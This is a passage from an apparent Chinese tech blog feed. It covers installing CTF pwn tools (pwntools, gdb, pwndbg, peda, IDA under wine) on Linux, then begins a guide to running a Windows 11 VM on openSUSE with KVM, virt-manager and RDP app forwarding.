class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for KDE</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for Gnome</span><br></code></pre></td></tr></table></figure><blockquote><p>参考 <a href="https://gist.github.com/turekt/71f6950bc9f048daaeb69479845b672b">Running pwnlib gdb (pwntools) feature inside Docker</a> 。</p></blockquote><h1 id="0x02-在本地直接搭建-CTF-Pwn-做题环境"><a href="#0x02-在本地直接搭建-CTF-Pwn-做题环境" class="headerlink" title="0x02. 在本地直接搭建 CTF Pwn 做题环境"></a>0x02. 在本地直接搭建 CTF Pwn 做题环境</h1><p>除了使用 Docker 之外，你也可以直接在本地搭建做题环境，对于常规的 Linux 用户态 pwn 题目，我们通常仅需要如下软件：</p><ul><li>IDA：用于对题目进行逆向分析。</li><li>Python + pwntools：用于编写漏洞利用脚本。</li><li>gdb + pwndbg&#x2F;peda：用于调试题目二进制文件。</li></ul><h2 id="获取-IDA"><a href="#获取-IDA" class="headerlink" title="获取 IDA"></a>获取 IDA</h2><p>IDA Pro（interactive Disassembler Professional）是由 Hex-Rays 公司出品的一款交互式反汇编工具，也是软件逆向工程当中最流行的一个静态分析工具。通过 IDA Pro 我们可以很方便地复原二进制程序的运行逻辑，从而进一步审计出其中存在的漏洞。</p><p><a href="https://hex-rays.com/ida-pro/">IDA Pro</a> 为付费软件，软件本体与不同架构的反编译引擎单独进行收费，你可以根据自己的需求在 Hex-rays 的官网自行购买相应的软件许可证以进行使用。</p><blockquote><p>截至 2024 年 4 月， IDA Pro 本体许可证的价格为 1975 USD，任一指令集架构反编译功能的许可证价格为 2765 USD。</p></blockquote><p>此外，Hex-rays 公司还提供基于云引擎的免费逆向工具 <a href="https://hex-rays.com/ida-free/">IDA Free</a>，目前仅支持 x86 逆向，不过对于绝大部分 CTF 中 Linux 下的用户态 Pwn 题目而言通常已足够使用。</p><h2 id="安装-Python"><a href="#安装-Python" class="headerlink" title="安装 Python"></a>安装 Python</h2><p>绝大部分 Linux 发行版目前已经自带 Python 运行环境，因此通常我们并不需要手动安装 Python。。若你的计算机上不存在 Python 运行环境，则可以根据自己所使用的发行版手动使用包管理器进行安装。</p><p>需要注意的是，部分 Linux 发行版中 Python 版本默认为 Python2，因此你可能需要手动指定安装 Python3。</p><h2 id="配置-venv-python-环境（可选）"><a href="#配置-venv-python-环境（可选）" class="headerlink" title="配置 venv python 环境（可选）"></a>配置 venv python 环境（可选）</h2><p>在部分 Linux 发行版上（如 <code>openSUSE Tumbleweed</code> ）使用 <code>pip</code> 命令时，你可能会遇到如下报错，这是由于发行版自身安全策略限制的缘故：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">error: externally-managed-environment<br><br>× This environment is externally managed<br>╰─&gt; To install Python packages <span class="hljs-keyword">system</span>-wide, <span class="hljs-keyword">try</span><br>    zypper install python311-xyz, where xyz is <span class="hljs-keyword">the</span> package<br>    you are trying <span class="hljs-built_in">to</span> install.<br>    <br>    If you wish <span class="hljs-built_in">to</span> install <span class="hljs-keyword">a</span> non-rpm packaged Python package,<br>    <span class="hljs-built_in">create</span> <span class="hljs-keyword">a</span> virtual environment <span class="hljs-keyword">using</span> python3<span class="hljs-number">.11</span> -m venv path/<span class="hljs-built_in">to</span>/venv.<br>    Then use path/<span class="hljs-built_in">to</span>/venv/bin/python <span class="hljs-keyword">and</span> path/<span class="hljs-built_in">to</span>/venv/bin/pip.<br>    <br>    If you wish <span class="hljs-built_in">to</span> install <span class="hljs-keyword">a</span> non-rpm packaged Python application,<br>    <span class="hljs-keyword">it</span> may be easiest <span class="hljs-built_in">to</span> use `pipx install xyz`, which will manage <span class="hljs-keyword">a</span><br>    virtual environment <span class="hljs-keyword">for</span> you. Install pipx via `zypper install python311-pipx` .<br><br>note: If you believe this is <span class="hljs-keyword">a</span> mistake, please contact your Python installation <span class="hljs-keyword">or</span> OS distribution provider. You can override this, <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> risk <span class="hljs-keyword">of</span> breaking your Python installation <span class="hljs-keyword">or</span> OS, <span class="hljs-keyword">by</span> passing <span class="hljs-comment">--break-system-packages.</span><br></code></pre></td></tr></table></figure><p>对于这种情况，我们可以选择使用 <a href="https://docs.python.org/zh-cn/3/library/venv.html#module-venv">venv</a> 模块创建“虚拟环境”。虚拟环境在默认情况下与其他虚拟环境中的软件以及操作系统中安装的 Python 解释器和库保持隔离，这确保了软件包安装的安全性，且使得我们能够简单地删除并从头开始重建环境。</p><p>我们可以通过如下命令创建一个新的虚拟环境（若路径不存在，则将被创建）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m venv 自定义的venv文件夹路径<br></code></pre></td></tr></table></figure><p>完成创建之后，我们便可以通过 <code>source</code> 命令进入到 venv 中，请根据你所使用的 shell 进行选择其中之一：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">source 自定义的venv文件夹路径/bin/activate         # for bash<br>source 自定义的venv文件夹路径/bin/activate.fish     # for fish<br>source 自定义的venv文件夹路径/bin/activate.csh     # for csh/tcsh<br></code></pre></td></tr></table></figure><blockquote><p>你也可以选择将这条命令加入到 <code>~/.bashrc</code> 文件中，从而在打开 shell 时默认执行。</p></blockquote><p>由于虚拟环境具有轻量、安全、可重构建的特性，因此即便是在你的计算机上并不存在安全策略限制，我们也更推荐你为 CTF&#x2F;Pwn 创建一个单独的 Python 虚拟环境。</p><h2 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h2><p><a href="https://docs.pwntools.com/en/stable/">pwntools</a> 是一个强大的 Python 软件包，其为我们提供了基本的 pwn 脚本编写环境，以及各类方便的利用工具，在安装好 Python 以及 pip 之后你可以很方便地使用如下指令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m pip install --upgrade pip<br>python3 -m pip install --upgrade pwntools<br></code></pre></td></tr></table></figure><p>之后在 Python 中便能很方便地通过 <code>from pwn import *</code> 指令使用该包中的各类工具，你也可以使用 <code>from pwn import 名字</code> 来仅导入所需的特定工具，或是使用 <code>import pwn</code> 导入包名后通过 <code>pwn.名字</code> 来使用对应的工具。</p><h2 id="安装-gdb"><a href="#安装-gdb" class="headerlink" title="安装 gdb"></a>安装 gdb</h2><p>GNU Debugger（GDB）是 GNU 项目开发的软件调试器，使用 gdb 我们可以很方便地对二进制程序进行动态调试。</p><p>gdb 在绝大部分 Linux 发行版上都已默认安装，你可以在 shell 中输入 <code>gdb</code> 命令进行确认（输入 <code>q</code> 退出）:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb</span><br>GNU gdb (GDB; SUSE Linux Enterprise 15) 13.2<br>Copyright (C) 2023 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type &quot;show copying&quot; and &quot;show warranty&quot; for details.<br>This GDB was configured as &quot;x86_64-suse-linux&quot;.<br>Type &quot;show configuration&quot; for configuration details.<br>For bug reporting instructions, please see:<br>&lt;http://bugs.opensuse.org/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br><br>For help, type &quot;help&quot;.<br>Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.<br>(gdb) <br></code></pre></td></tr></table></figure><p>若你的计算机尚未安装 gdb，则可以使用如下命令进行安装，请自行分辨你所使用的发行版。</p><p>Debian &#x2F; Ubuntu:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install -y gdb<br></code></pre></td></tr></table></figure><p>openSUSE Leap &#x2F; Tumbleweed &#x2F; SLE:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper install gdb<br></code></pre></td></tr></table></figure><p>Arch Linux &#x2F; Manjaro &#x2F; EndeavourOS:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yay -S gdb # 若未配置 AUR，你也可以使用 pacman -S gdb 进行安装<br></code></pre></td></tr></table></figure><p>Fedora &#x2F; CentOS &#x2F; RHEL:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yum install gdb # 事实上，yum 被软链接到 dnf<br></code></pre></td></tr></table></figure><h2 id="安装-pwndbg"><a href="#安装-pwndbg" class="headerlink" title="安装 pwndbg"></a>安装 pwndbg</h2><p><a href="https://github.com/pwndbg/pwndbg">pwndbg</a> (&#x2F;paʊnˈdiˌbʌɡ&#x2F;) 是一个强大的 GDB 插件，通过该插件我们可以在调试时很方便地查看运行环境以及获取堆内存布局等信息。</p><p>pwndbg 项目自带了安装脚本，因此我们可以很方便地从源码进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/pwndbg/pwndbg<br>cd pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><p>对于使用 nix 包管理器的发行版（如 NixOS），你可以通过如下命令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nix shell github:pwndbg/pwndbg<br>pwndbg ./your-binary<br></code></pre></td></tr></table></figure><h2 id="安装-peda"><a href="#安装-peda" class="headerlink" title="安装 peda"></a>安装 peda</h2><blockquote><p>注：peda 和 pwndbg 你只需要安装其中之一，由于功能重复，且为了避免插件冲突，我们并不推荐你同时安装这两个插件。</p></blockquote><p><a href="https://github.com/longld/peda">peda</a> 是一个强大的 GDB 插件，通过该插件我们可以在调试时很方便地查看运行环境以及获取堆内存布局等信息。</p><p>peda 插件无需过多配置，我们只需要将源码下载到本地后更新 gdb 配置即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/longld/peda.git ~/peda<br>echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit<br>echo &quot;DONE! debug your program with gdb and enjoy&quot;<br></code></pre></td></tr></table></figure><h1 id="0x03-杂项配置"><a href="#0x03-杂项配置" class="headerlink" title="0x03. 杂项配置"></a>0x03. 杂项配置</h1><h2 id="为-Linux-下运行-IDA-配置-desktop-shortcut"><a href="#为-Linux-下运行-IDA-配置-desktop-shortcut" class="headerlink" title="为 Linux 下运行 IDA 配置 desktop shortcut"></a>为 Linux 下运行 IDA 配置 desktop shortcut</h2><p>wine 对于 Windows 各种 API 的重写已经非常成熟了，这使得 IDA Pro 的 Windows 版本（或许也是绝大多数人会使用的版本）能够比较轻松地在 Linux 下运行，对于完全工作在 Linux 下的同学这是一件好事，因为这意味着不需要使用虚拟机来单独运行 IDA Pro</p><p>对于想要为 IDA 创建快捷方式的 Linux Desktop 用户，你可以参考如下模板编写 <code>.desktop</code> 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/usr/bin/env xdg-open</span><br>[Desktop Entry]<br>Name=IDA Pro 7.5<br>Comment=A powerful disassembler and a versatile debugger<br>GenericName=Disassembler<br>Exec=wine /home/arttnba3/Applications/IDA7.5/ida64.exe<br>Icon=/home/arttnba3/Applications/pic/ida64.png<br>Type=Application<br>Categories=Development;<br>Keywords=IDA;<br></code></pre></td></tr></table></figure><p>完成编写后将该文件放到 <code>~/.local/share/applications/</code> 目录下即可：</p><p><img src="https://s2.loli.net/2024/05/15/7UVMnDA6q1eJblK.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;信 Docker ，得永生&lt;/p&gt;</summary>
    
    
    
    <category term="PWN" scheme="https://arttnba3.github.io/categories/PWN/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【SUSE.0x00】在 openSUSE 上食用 Win VM</title>
    <link href="https://arttnba3.github.io/2024/02/27/SUSE-0X00_WIN_VM_SETUP_GUIDE/"/>
    <id>https://arttnba3.github.io/2024/02/27/SUSE-0X00_WIN_VM_SETUP_GUIDE/</id>
    <published>2024-02-27T03:22:58.000Z</published>
    <updated>2024-03-21T20:28:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>4202 年了，Linux Desktop 还会好吗？</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者自从 <code>Win 物理机 + Linux VM</code> 转到 <code>Almost all in Linux</code> 的生活已经过了大半年了，用 openSUSE 也已经小半年了，除了 Nvidia on Wayland 日常撕裂以及盒盖行为设定为 <code>Lock Screen</code> 会醒不来以外似乎还没有太多问题，但除了代码以外的日常生活总感觉不是特别彳亍：</p><h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><p>笔者比较喜欢使用酷狗音乐进行听歌（ <del>👴一直都是高贵的酷狗年费会员啊</del> ），但是酷狗是没有官方的 Linux 安装包的，使用 wine 兼任层可以跑起来但是笔者捣鼓了大半天都没有声音：(</p><blockquote><p>Arch 社区打的酷狗 AUR 包似乎可以正常播放，但是笔者也没有时间重新弄回 Arch 了，更没有那个闲时间去研究怎么在 SUSE 上弄了</p></blockquote><p>网易云音乐 <em>曾经有 Linux 版，但是用的 deb 打包，而且也非常久没有更新了，现在官网上也下架 Linux 版了</em> 因为笔者不常用网易云所以也没有尝试用 wine 跑过，但以 wine 现在的水平估计也不会好到哪去（</p><blockquote><p>腾讯音乐之类的就没有用过也不太打算尝试了：）</p></blockquote><p>海外的大部分听歌软件像 <a href="https://www.spotify.com/">Spotify</a> 都是有 <a href="https://www.spotify.com/au/download/linux/">Linux 版</a> 的，但是笔者也会听一些非常小众的歌，这些在 Spotify 上都是没有的，上边只有那些国际化大歌曲（ <del>这就不得不提国内很多小众音乐人的含金量了，什么叫世界第一强国啊</del> ）</p><p>但这还不算最要命的，Sportify 有个非常致命且非常 sb 的设计——<strong>电脑端的 Spotify 每听个一两首歌就会插入一段广告来逼你开会员</strong>，这样的产品策略让笔者很难去使用一些比较正面的词汇去进行评价</p><p><img src="https://s2.loli.net/2024/02/21/MRftUv7gSXDbn8I.png" alt="try not to c*m in 30 seconds"></p><h3 id="Office-套件"><a href="#Office-套件" class="headerlink" title="Office 套件"></a>Office 套件</h3><p><a href="https://www.libreoffice.org/discover/libreoffice/">LibreOffice</a> 作为大部分 Linux 发行版都会默认带着的开源 Office 套件，用着感觉虽然还行但是和 Microsoft Office 相比总感觉有哪里差点意思（<del>就是用着总感觉有哪里不得劲</del>），当然临时顶用其实还好但是 <em>直接重启切回 Windows 写文档不好么</em></p><p>——Microsoft Office 虽然没有 Linux 版但是有个网页版，支持在网页进行编辑甚至在网页上完成 PPT 演示的功能，但是网页版的用着总感觉 <em>也还是差点意思</em> ，而且和 native app 相比总感觉有些卡卡的，唯一的优点大概就是 all on cloud 不用担心数据丢失了：</p><p><img src="https://s2.loli.net/2024/02/21/K4tE6BdfTzigPDL.png" alt="临时做个 PPT 演示还行，但是这样为什么不直接用 Windows 呢"></p><blockquote><p>至于国产 Office 套件 <a href="https://www.wps.com/">WPS</a>，技术水平暂且不谈,当笔者在自家老母亲的旧电脑上打开这软件后跳出一堆各种花花绿绿的广告铺满屏幕然后让电脑变得特别特别卡的时候笔者就决定<strong>哪怕再多花点钱多买几套正版的 Office 也不会再考虑这一款国产软件</strong></p><blockquote><p>当然，除了这个问题以外，WPS 还存在<a href="https://www.zhihu.com/question/542676012">数据安全问题</a>，那这是否就有点…</p></blockquote></blockquote><h3 id="办公软件"><a href="#办公软件" class="headerlink" title="办公软件"></a>办公软件</h3><p>在这个 QQ 都转向 NTQQ 的 4202 年微信还是迟迟不出 Linux 版就令人很难评了<del>这就不得不提某人的含马量了（）</del>，使用 wine 来运行 WeChat 勉强算是一个可行的策略，但是强行用 wine 跑起来的微信只能说是勉强能用，各种功能缺失以及不完整再加上 wine 的功能不完善带来的令人难以直视的各种边框更是让人想要毁灭世界，而功能本就缺失的网页版微信也慢慢变得不再可用，想要在 openSUSE 上完美使用微信似乎已经变成了一种奢求</p><p><img src="https://s2.loli.net/2024/02/23/FoyxtmMUnrJzel9.png" alt="有没有深圳上单能去猎一下某人的🐎.jpg"></p><p>海外的办公软件如 Slack 和 Discord （这个大概勉强也能算办公软件）倒是有原生 Linux 版，What’s App 有网页版但是笔者倒是没有用过，Teams 则只有网页版可用</p><blockquote><p>飞书以及其海外版 Lark 却是都有非常好用的原生 Linux 版， <del>那这里👴就不得不夸一夸👴的前东家国际化大企业字节跳动的含金量了</del> </p><p>至于像钉钉这样的软件似乎也是有 Linux 版，不过笔者基本用不到这个软件所以暂且就不进行深入了解了</p></blockquote><h3 id="游戏及各类其它问题"><a href="#游戏及各类其它问题" class="headerlink" title="游戏及各类其它问题"></a>游戏及各类其它问题</h3><p>这里就不展开说了，因为前面已经讲了这么多废话了，同时笔者也懒得再打字了，总而言之 Linux 除了与计算机专业直接强相关的东西以外似乎都没有比较完美的原生解决方案，这令笔者十分苦恼 ：(</p><h2 id="How-to-解决？"><a href="#How-to-解决？" class="headerlink" title="How to 解决？"></a>How to 解决？</h2><p>让我们重新回顾《虚拟化导论》中的一个基本概念：<code>只要我们能够通过某种方式向上层提供表现相同的抽象接口，在上层看来我们就是正常的该层所提供的资源，从而就实现了对该层的虚拟化</code> ；因此对于 <code>想要在 Linux 下运行 Windows 独占的软件</code> 这个需求而言，我们只需要提供一个相应的兼容层便能运行——<a href="https://www.winehq.org/">wine</a> 便是这样一个软件，其通过提供相应的 Windows 执行环境（如重新实现各种 DLL）来实现，虽然说目前已经能够流畅地运行很多原生 Windows 软件，但是要把整个 Windows 都给重新实现一遍的工作量相当巨大，至少就目前而言还是缺少相当多的各种不同的运行库，难以真正地在 *NIX 系统上完美无缝运行 Windows 下的二进制程序</p><p><img src="https://s2.loli.net/2024/02/23/6asVIrGX1WygDmq.png" alt="网易云其实原本是有 Linux 原生的，可惜前几年终止开发了"></p><p>重新再看虚拟化层次的划分，Wine 是通过实现了 API 抽象层来完成 Windows 各种运行库的虚拟化，那么再往下一层呢——若是我们能够实现硬件抽象层，我们便能完成操作系统级的虚拟化，这样我们自然便有了一个对应操作系统的完整运行环境——即通过<strong>虚拟机</strong>（Virtual Machine）来运行一个完整的 Windows 系统，这样<strong>我们便能完美运行原生的 Windows 程序</strong> ，若是之后我们再将一些必要的设备给 passthrough 进 Windows 中（或是纯模拟也行）、建立好完善的共享文件夹等机制，我们便能舒适地将 Windows 虚拟机融入到我们的 Linux 物理机当中：）</p><blockquote><p>当然，虚拟机的性能损耗肯定是有的，但很多情况下这些性能损耗其实无所谓 ：）</p></blockquote><p><img src="https://s2.loli.net/2022/08/02/lDLgE6tyNe87M12.png"></p><p>因此本篇文章将教大家如何在 Linux 上优雅地食用 Windows 虚拟机</p><blockquote><p>——好吧， <em>运行一个 Windows 虚拟机来跑 Windows 程序这件事似乎是没有任何的新意</em> ，<strong>但若是我们能够通过 RDP 连接直接映射不同的程序窗口而非整个桌面呢？</strong> ——<code>远程桌面协议</code>（Remote Desktop Protocol）让通过网络的远程计算机桌面图像传输与鼠标键盘事件传输成为了可能，同时 xfreerdp 支持仅传输单个应用窗口，由此<strong>我们就能达成在 Linux 桌面中近乎完美地原生运行 Windows 程序的效果</strong></p><p><img src="https://s2.loli.net/2024/02/21/uqlDdERXCQpo3Z7.png" alt="image.png"></p><p>不过由于各种问题，<strong>目前这种办法依然存在较大的 bug，没办法足够舒适地运行</strong>，目前而言只能继续期待后人的努力：）</p></blockquote><h1 id="0x01-通过-Virt-Manager-KVM-运行一个-Windows-虚拟机"><a href="#0x01-通过-Virt-Manager-KVM-运行一个-Windows-虚拟机" class="headerlink" title="0x01. 通过 Virt-Manager + KVM 运行一个 Windows 虚拟机"></a>0x01. 通过 Virt-Manager + KVM 运行一个 Windows 虚拟机</h1><h2 id="安装虚拟化相关组件"><a href="#安装虚拟化相关组件" class="headerlink" title="安装虚拟化相关组件"></a>安装虚拟化相关组件</h2><blockquote><p>参考 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/index.html">openSUSE - Virtualization Guide</a> 和 <a href="https://zh.opensuse.org/KVM">openSUSE wiki - KVM</a> 以及 <a href="https://documentation.suse.com/zh-cn/sles/15-SP4/html/SLES-all/cha-kvm-intro.html"> SUSE Linux Enterprise Server 文档 - 虚拟化指南</a></p></blockquote><p>首先检查自己的 CPU 是否支持硬件虚拟化（<del>不过这个年代应该没有不支持硬件虚拟化的 CPU 了吧</del>）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo LC_ALL=C lscpu | grep Virtualization</span><br></code></pre></td></tr></table></figure><blockquote><p>如果没有结果的话重启进 BIOS&#x2F;UEFI 里开一下，有些机型默认不会开启 CPU 虚拟化，<del>若是真的不支持硬件虚拟化那笔者还是建议你赶紧换一台电脑，或者至少换个 U 吧，都什么年代还在用传统电脑</del></p></blockquote><p>然后安装 libvirt,一个非常舒适的虚拟机管理库，这里直接用 YaST 来安会非常方便：</p><p><img src="https://s2.loli.net/2024/02/21/MeTP9qdfWFSRG6g.png" alt="这就是我们 SUSE 的 YaST 啊，你们有没有这样的 YaST 啊，真是 YY 又 aa、SS 又 TT 啊.jpg"></p><blockquote><p>这里笔者安完才发现忘了勾上 <code>KVM server</code> 了，但是再打开发现按钮灰了没办法补勾上…..不过也无所谓了反正看这篇文章的小伙伴记得勾上就好 ：）</p></blockquote><p>然后安装 virt-manager 和 libvirt-daemon：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> virt-manager libvirt-daemon</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> libvirtd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl start libvirtd</span><br></code></pre></td></tr></table></figure><blockquote><p>QEMU 的话因为要做 kernel pwn 的缘故笔者很早就安装上了所以安装步骤这里就略过了，这里大家就自己想办法安吧（笑</p></blockquote><p>在 <code>.bash_profile</code> 里导入这个变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> LIBVIRT_DEFAULT_URI=qemu:///system<br></code></pre></td></tr></table></figure><p>把自己加相应的组里再重启：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -a -G libvirt $(<span class="hljs-built_in">whoami</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -a -G kvm $(<span class="hljs-built_in">whoami</span>)</span><br></code></pre></td></tr></table></figure><p>配置 default 网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-define /usr/share/libvirt/networks/default.xml</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-autostart default</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-start default</span><br></code></pre></td></tr></table></figure><blockquote><p>注：libvirt 默认的 NAT 网络<strong>似乎有些小问题</strong> （参见 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/cha-libvirt-host.html">openSUSE doc</a>），如果你没法联网那笔者还是建议使用桥接模式</p></blockquote><h2 id="安装-Windows-虚拟机"><a href="#安装-Windows-虚拟机" class="headerlink" title="安装 Windows 虚拟机"></a>安装 Windows 虚拟机</h2><p>首先在 virt-manager 里 enable 上 xml 编辑：</p><p><img src="https://s2.loli.net/2024/02/22/ZgwYWakbBunNDTR.png" alt="image.png"></p><p>然后下载 <a href="https://www.microsoft.com/software-download/windows11">Windows ISO</a> 和 <a href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso">KVM virtio Drivers</a></p><p>之后在 virt-manager 里创建一个虚拟机，创建过程中别忘了勾上 <code>Customize configuration before install</code> ，完成基本配置后挂上第二个 ISO：</p><p><img src="https://s2.loli.net/2024/02/22/BrWcYaihNm83lu9.png" alt="image.png"></p><p>然后在 CPU 的 XML 里编辑 <code>clock</code> ，<strong>修改为如下配置</strong> ,这样可以减少待机开销：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">clock</span> <span class="hljs-attr">offset</span>=<span class="hljs-string">&#x27;localtime&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">timer</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;hpet&#x27;</span> <span class="hljs-attr">present</span>=<span class="hljs-string">&#x27;yes&#x27;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">timer</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;hypervclock&#x27;</span> <span class="hljs-attr">present</span>=<span class="hljs-string">&#x27;yes&#x27;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">clock</span>&gt;</span><br></code></pre></td></tr></table></figure><p>启用 <code>shared memory</code> ：</p><p><img src="https://s2.loli.net/2024/02/22/lgUtwfdYejPDprI.png"></p><p>其他的比如说：</p><ul><li>virt-manager 里该 VM 名字改为 <code>RDPWindows</code></li><li>配置自启动</li><li>硬盘类型改为 virtio</li><li>网卡模型改为 virtio（可选）</li></ul><p>之类的过程笔者这里就略过了，网上资料一大把：）</p><p>接下来 <code>Begin Installation</code> 然后就是：Windows，启动————</p><blockquote><p>忘了截开始界面了，无所谓了</p></blockquote><p>我们的硬盘是 virtio 的，所以首先是 <code>加载驱动程序</code>：</p><p><img src="https://s2.loli.net/2024/02/22/iKncHYCWN3XwAkU.png"></p><p>Windows 安装程序会自动扫到我们的 virtio 驱动的 CD，直接选对应版本：</p><p><img src="https://s2.loli.net/2024/02/22/7JUZdRSg68VINnk.png"></p><p>Windows 11 默认没有网不给安装非常 sb，不过 <code>shift + F10</code> 唤出 cmd 输入 <code>OOBE\BYPASSNRO</code> 重新开始就能绕过了：</p><p><img src="https://s2.loli.net/2024/02/22/pOfl2IcSr9YbxtC.png"></p><p>进系统以后找到我们的 virtio 驱动光碟，运行 <code>virtio-win-gt-x64.msi</code> 和 <code>virtio-win-guest-tools.exe</code> 安驱动（全选就行），然后就有网了：</p><p><img src="https://s2.loli.net/2024/02/22/AIfG5mivr6zN9yu.png"></p><p>然后开浏览器把 <a href="https://github.com/Fmstrat/winapps/blob/main/install/RDPApps.reg">https://github.com/Fmstrat/winapps/blob/main/install/RDPApps.reg</a> 下载到本地并右键 <code>合并</code> ：</p><p><img src="https://s2.loli.net/2024/02/22/Ilq7dp9ocfCzFTm.png"></p><p>然后进设置里开远程桌面就行：</p><p><img 